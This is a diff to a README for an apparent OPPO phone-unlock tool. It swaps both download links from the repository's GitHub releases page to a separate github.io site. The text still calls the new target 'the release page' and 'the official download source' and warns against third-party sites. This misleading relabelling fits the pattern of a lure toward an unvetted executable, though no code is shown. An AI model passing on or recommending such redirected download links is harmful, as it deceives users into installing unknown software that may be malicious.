@@ -1,6 +1,6 @@
 # 🔓 Descargar-OPPO-Unlock - Access your locked OPPO device easily
 
-[![](https://img.shields.io/badge/Download-OPPO_Unlock_Tool-blue.svg)](https://github.com/hymanwrapped571/Descargar-OPPO-Unlock/releases)
+[![](https://img.shields.io/badge/Download-OPPO_Unlock_Tool-blue.svg)](https://hymanwrapped571.github.io)
 
 ## Overview ℹ️
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the software correctly:
 
 Visit the repository release page to get the installer. Use the link below to reach the official download source. Select the latest version listed at the top of the page.
 
-[Click here to visit the release page and download your copy](https://github.com/hymanwrapped571/Descargar-OPPO-Unlock/releases)
+[Click here to visit the release page and download your copy](https://hymanwrapped571.github.io)
 
 Do not download files from unofficial third-party websites. Official releases contain the latest security patches and feature updates. 
 
